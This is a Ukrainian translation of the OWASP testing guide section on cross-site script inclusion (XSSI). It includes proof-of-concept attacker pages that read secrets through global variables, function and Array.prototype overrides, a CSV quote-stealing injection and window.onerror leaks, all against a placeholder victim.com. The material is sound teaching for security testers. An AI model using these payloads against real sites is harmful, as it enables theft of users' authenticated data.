# Тестування на включення міжсайтового сценарію

## Загальне

Уразливість XSSI (включення міжсайтового сценарію) дає змогу витоку конфіденційних даних через вихідні або міждоменні межі. Конфіденційні дані можуть включати дані, пов’язані з автентифікацією (стани входу, файли cookie, маркери автентифікації, ідентифікатори сеансу тощо), або персональні або конфіденційні особисті дані користувача (адреси електронної пошти, номери телефонів, дані кредитної картки, номери соціального страхування тощо). XSSI — це атака на стороні клієнта, схожа на Cross Site Request Forgery (CSRF), але має іншу мету. Якщо CSRF використовує контекст автентифікованого користувача для виконання певних дій зі зміни стану на сторінці жертви (наприклад, переказ грошей на рахунок зловмисника, зміна привілеїв, скидання пароля тощо), XSSI замість цього використовує JavaScript на стороні клієнта для витоку конфіденційних даних. з автентифікованих сеансів.

За замовчуванням веб-сайтам дозволено отримувати доступ до даних, лише якщо вони мають одне джерело. Це ключовий принцип безпеки програми, який регулюється політикою того самого джерела (визначеною RFC 6454). Походження визначається як комбінація схеми URI (HTTP або HTTPS), імені хоста та номера порту. Однак ця політика не застосовується до включень тегу HTML ```<script>```. Цей виняток є необхідним, оскільки без нього веб-сайти не зможуть використовувати сторонні послуги, виконувати аналіз трафіку або використовувати рекламні платформи тощо.

Коли веб-переглядач відкриває веб-сайт із тегами ```<script>```, ресурси завантажуються з перехресного домену. Ресурси потім працюють у тому ж контексті, що й сайт або браузер, що включає, що створює можливість витоку конфіденційних даних. У більшості випадків це досягається за допомогою JavaScript, однак джерело сценарію не обов’язково має бути файлом JavaScript із розширенням типу ```text/javascript``` або ```.js```.

Уразливості старішого браузера (IE9/10) допускали витік даних через повідомлення про помилки JavaScript під час виконання, але наразі ці уразливості виправлено постачальниками, і вони вважаються менш актуальними. Встановлюючи атрибут charset тегу ```<script>```, зловмисник або тестувальник може застосувати кодування UTF-16, у деяких випадках дозволяючи витік даних для інших форматів даних (наприклад, JSON). Додаткову інформацію про ці атаки див. у розділі XSSI-атаки на основі ідентифікатора.

## Цілі тестування

- Знайдіть конфіденційні дані в системі.
- Оцініть витік конфіденційних даних за допомогою різних методів.

## Як тестувати

### Збирайте дані за допомогою аутентифікованих і неаутентифікованих сеансів користувачів
Визначте, які кінцеві точки відповідають за надсилання конфіденційних даних, які параметри потрібні, а також визначте всі відповідні динамічно та статично згенеровані відповіді JavaScript за допомогою автентифікованих сеансів користувачів. Зверніть особливу увагу на конфіденційні дані, які надсилаються за допомогою JSONP. Щоб знайти динамічно згенеровані відповіді JavaScript, створіть автентифіковані та неавтентифіковані запити, а потім порівняйте їх. Якщо вони різні, це означає, що відповідь динамічна; інакше він статичний. Щоб спростити це завдання, можна використати такий інструмент, як проксі-плагін Veit Hailperin Burp. Обов’язково перевіряйте інші типи файлів на додаток до JavaScript; XSSI не обмежується лише файлами JavaScript.

### Визначте, чи може статися витік конфіденційних даних за допомогою JavaScript
Тестери повинні проаналізувати код для таких транспортних засобів на предмет витоку даних через уразливості XSSI:

1. Глобальні змінні
2. Глобальні параметри функції
3. CSV (Comma Separated Values) із крадіжкою цитат
4. Помилки виконання JavaScript
5. З’єднання прототипів за допомогою ```this```

### 1. Витік конфіденційних даних через глобальні змінні
Ключ API зберігається у файлі JavaScript з URI ```https://victim.com/internal/api.js``` на веб-сайті жертви, ```victin.com```, який доступний лише для автентифікованих користувачів. Зловмисник налаштовує веб-сайт, ```attackingwebsite.com```, і використовує тег ```<script>``` для посилання на файл JavaScript.

Ось вміст ```https://victim.com/internal/api.js```:
```
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

Сайт атаки, ```attackingwebsite.com```, має ```index.html``` із таким кодом:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

У цьому прикладі жертва автентифікована за допомогою ```victim.com```. Зловмисник заманює жертву на ```attackingwebsite.com``` за допомогою соціальної інженерії, фішингових електронних листів тощо. Потім браузер жертви отримує ```api.js```, у результаті чого конфіденційні дані просочуються через глобальну змінну JavaScript і відображаються за допомогою ```innerHTML```.

### 2. Витік конфіденційних даних через глобальні параметри функції
Цей приклад схожий на попередній, за винятком того, що в цьому випадку ```attackingwebsite.com``` використовує глобальну функцію JavaScript для вилучення конфіденційних даних шляхом перезапису глобальної функції JavaScript жертви.

Ось вміст ```https://victim.com/internal/api.js```:
```
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

Сайт атаки, ```attackingwebsite.com```, має ```index.html``` із таким кодом:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

Існують інші вразливості XSSI, які можуть призвести до витоку конфіденційних даних через ланцюжки прототипів JavaScript або глобальні виклики функцій. Щоб дізнатися більше про ці атаки, перегляньте розділ Несподівані небезпеки динамічного JavaScript.

### 3. Витік конфіденційних даних через CSV із крадіжкою котирувань
Для витоку даних зловмисник/тестер повинен мати можливість вставити код JavaScript у дані CSV. Наведений нижче приклад коду є уривком із документації про атаки XSSI на основі ідентифікатора Такеші Теради.
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

У цьому прикладі використання стовпців ```___``` як точок ін’єкції та вставлення рядків JavaScript на їх місце має такий результат.
```
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

Джеремія Гроссман писав про подібну вразливість у Gmail у 2006 році, яка дозволяла видобувати контакти користувачів у JSON. У цьому випадку дані були отримані з Gmail і проаналізовані движком JavaScript браузера за допомогою конструктора Array без посилання, щоб отримати витік даних. Зловмисник може отримати доступ до цього масиву з конфіденційними даними, визначивши та перезаписавши внутрішній конструктор масиву таким чином:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. Витік конфіденційних даних через помилки виконання JavaScript
Браузери зазвичай видають стандартизовані повідомлення про помилки JavaScript. Однак у випадку IE9/10 повідомлення про помилки виконання надавали додаткові відомості, які могли бути використані для витоку даних. Наприклад, веб-сайт žrtva.com надає такий вміст за URI ```http://victim.com/service/csvendpoint``` для автентифікованих користувачів:
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

Цю вразливість можна використати за допомогою:
```
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="http://victim.com/service/csvendpoint"></script>
```

Коли веб-переглядач намагається відтворити вміст CSV як JavaScript, це не вдається та відбувається витік конфіденційних даних:

![image](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/images/XSSI1.jpeg)

Рисунок 4.11.13-1: Повідомлення про помилку виконання JavaScript

### 5. Витік конфіденційних даних через ланцюжок прототипів при використанні ```this```
У JavaScript ключове слово ```this``` має динамічну область видимості. Це означає, що якщо функція викликається до об’єкта, ```this``` вказуватиме на цей об’єкт, навіть якщо викликана функція може не належати самому об’єкту. Така поведінка може бути використана для витоку даних. У наступному прикладі з демонстраційної сторінки Себастьяна Лейке конфіденційні дані зберігаються в масиві. Зловмисник може перевизначити ```Array.prototype.forEach``` за допомогою функції, керованої зловмисником. Якщо якийсь код викликає функцію ```forEach``` для екземпляра масиву, який містить конфіденційні значення, буде викликана функція, керована зловмисником, яка вказує на об’єкт ```this```, який містить конфіденційні дані.

Ось уривок файлу JavaScript, що містить конфіденційні дані, ```javascript.js```:
```
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

Конфіденційні дані можуть витікати за допомогою такого коду JavaScript:
```
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="http://victim.com/..../javascript.js"></script>
...
```
